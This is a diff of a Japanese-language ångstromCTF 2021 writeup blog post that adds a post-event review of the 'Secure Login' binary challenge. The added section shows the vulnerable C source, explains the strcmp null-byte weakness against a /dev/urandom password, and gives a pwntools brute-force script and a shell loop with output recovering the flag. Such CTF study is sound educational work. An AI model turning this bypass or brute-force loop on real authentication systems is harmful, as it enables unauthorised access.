@@ -1,11 +1,11 @@
 ---
 title: "ångstromCTF 2021 Writeup"
 date: 2021-04-08T13:00:00+09:00
-lastmod: 2021-04-08T13:00:00+09:00
+lastmod: 2021-06-03T22:00:00+09:00
 draft: false
 keywords: []
 description: ""
-tags: ["CTF"]
+tags: ["CTF", "Reviewed"]
 categories: ["CTF"]
 author: ""
 ---
@@ -15,6 +15,7 @@ author: ""
 </a>
 {{% /right %}}
 
+(2021/06/03 - Binaryを少し復習しました。下の方に追記してます。)
 
 URL: [https://2021.angstromctf.com/challenges](https://2021.angstromctf.com/challenges)
 <br /><br />
@@ -444,6 +445,129 @@ actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer
 <br>
 
 Flag: `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`
+
+
+
+<br /><br />
+<br /><br />
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はイベント終了後に行った復習です。
+
+
+
+<br /><br />
+<br /><br />
+## [Binary]: Secure Login (50 points)
+- - -
+### Challenge
+> My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).
+<br><br>
+Hint: Look into how strcmp works and how that fits in with what /dev/urandom returns.
+
+
+Attachment:
+
+- login  (ELF 64bit)
+- login.c
+
+ソースコードの中身：
+
+{{< highlight c "linenos=table,hl_lines=6 21" >}}
+#include <stdio.h>
+
+char password[128];
+
+void generate_password() {
+	FILE *file = fopen("/dev/urandom","r");
+	fgets(password, 128, file);
+	fclose(file);
+}
+
+void main() {
+	puts("Welcome to my ultra secure login service!");
+
+	// no way they can guess my password if it's random!
+	generate_password();
+
+	char input[128];
+	printf("Enter the password: ");
+	fgets(input, 128, stdin);
+
+	if (strcmp(input, password) == 0) {
+		char flag[128];
+
+		FILE *file = fopen("flag.txt","r");
+		if (!file) {
+		    puts("Error: missing flag.txt.");
+		    exit(1);
+		}
+
+		fgets(flag, 128, file);
+		puts(flag);
+	} else {
+		puts("Wrong!");
+	}
+}
+{{< / highlight >}}
+
+<br />
+### Solution
+urandomの値と入力値をstrcmpで比較しているところがポイントです。urandomの先頭の1バイトが00だとNull文字になり、入力値にNull文字を指定するとstrcmpがパスできます。1バイトなので、確率は1/256です。
+
+その１
+
+```Python
+#!/usr/bin/env python
+from pwn import *
+context.log_level = 'critical'
+
+while 1:
+    s = process('./login')
+    s.recv()
+    s.sendline('\x00\n')
+    msg = s.recvline()
+    if "Wrong" not in msg:
+        print(msg)
+    s.close()
+```
+
+<br />
+実行結果：
+<pre>
+$ ./login_solve.py
+Enter the password: actf{if_youre_reading_this_ive_been_hacked}
+</pre>
+
+
+<br /><br />
+その２
+
+以下のやり方でもできます。エンターを押し続けていると、そのうちフラグが取れます。
+
+<pre>
+$ while true ; do ((python -c 'print("\x00")'; cat -) | ./login) ; done
+Welcome to my ultra secure login service!
+Enter the password: Wrong!
+
+Welcome to my ultra secure login service!
+Enter the password: Wrong!
+
+Welcome to my ultra secure login service!
+Enter the password: Wrong!
+
+Welcome to my ultra secure login service!
+Enter the password: Wrong!
+
+Welcome to my ultra secure login service!
+Enter the password: actf{if_youre_reading_this_ive_been_hacked}
+
+</pre>
+
+<br />
+
+Flag: `actf{if_youre_reading_this_ive_been_hacked}`
+
 
 
 <br /><br />
